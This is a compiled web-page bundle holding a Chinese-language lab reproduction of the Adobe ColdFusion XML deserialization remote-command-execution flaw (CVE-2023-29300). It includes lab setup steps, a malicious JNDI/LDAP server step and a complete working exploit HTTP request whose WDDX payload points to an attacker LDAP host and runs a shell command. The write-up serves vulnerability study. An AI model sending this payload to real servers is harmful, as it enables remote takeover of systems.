import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as l,c as r,a as e,b as t,d as n,e as o}from"./app-58e4a7d6.js";const s={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),u=e("p",null,"Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。",-1),p=e("p",null,"Adobe ColdFusion在2018.0.16、2021.0.6、2023.0.0.330468版本及以前，存在一处XML反序列化漏洞。攻击者可以利用该漏洞调用Java中任意setter方法，最终执行任意命令。",-1),g=e("p",null,"参考链接：",-1),m={href:"https://blog.projectdiscovery.io/adobe-coldfusion-rce/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://xz.aliyun.com/t/13413",target:"_blank",rel:"noopener noreferrer"},h=o(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动一个Adobe ColdFusion 2018.0.15服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待一段时间后环境启动成功，访问<code>http://your-vps-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装Adobe ColdFusion。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226160629443.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>要利用这个漏洞，需要先找到一个可利用的setter方法作为Gadget。最常见的Gadget是利用<code>com.sun.rowset.JdbcRowSetImpl</code>来进行JNDI注入，并执行任意命令。</p>`,7),_=e("code",null,"CommonsBeanutils1",-1),v={href:"https://github.com/rebeyond/JNDInjector/releases",target:"_blank",rel:"noopener noreferrer"},f=o(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226154836838.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，将恶意LDAP地址替换到如下请求中发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /CFIDE/adminapi/accessmanager.cfc?method=foo&amp;_cfclient=true HTTP/1.1
Host: your-vps-ip:8500
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 333

argumentCollection=&lt;wddxPacket version=&#39;1.0&#39;&gt;&lt;header/&gt;&lt;data&gt;&lt;struct type=&#39;xcom.sun.rowset.JdbcRowSetImplx&#39;&gt;&lt;var name=&#39;dataSourceName&#39;&gt;&lt;string&gt;ldap://192.168.24.1/HiJbyQaUgJ/CommonsBeanutils1/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL2F3ZXNvbWVfcG9jIn0=&lt;/string&gt;&lt;/var&gt;&lt;var name=&#39;autoCommit&#39;&gt;&lt;boolean value=&#39;true&#39;/&gt;&lt;/var&gt;&lt;/struct&gt;&lt;/data&gt;&lt;/wddxPacket&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见，<code>touch /tmp/success</code>已被成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226154946942.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function x(C,k){const a=d("ExternalLinkIcon");return l(),r("div",null,[c,u,p,g,e("ul",null,[e("li",null,[e("a",m,[t("https://blog.projectdiscovery.io/adobe-coldfusion-rce/"),n(a)])]),e("li",null,[e("a",b,[t("https://xz.aliyun.com/t/13413"),n(a)])])]),h,e("p",null,[t("首先，启动一个恶意JNDI服务器，并加载"),_,t("作为内层反序列化Gadget。Github上有数个工具可以使用，比如"),e("a",v,[t("https://github.com/rebeyond/JNDInjector/releases"),n(a)]),t("：")]),f])}const A=i(s,[["render",x],["__file","Adobe ColdFusion XML 反序列化命令执行漏洞 CVE-2023-29300.html.vue"]]);export{A as default};
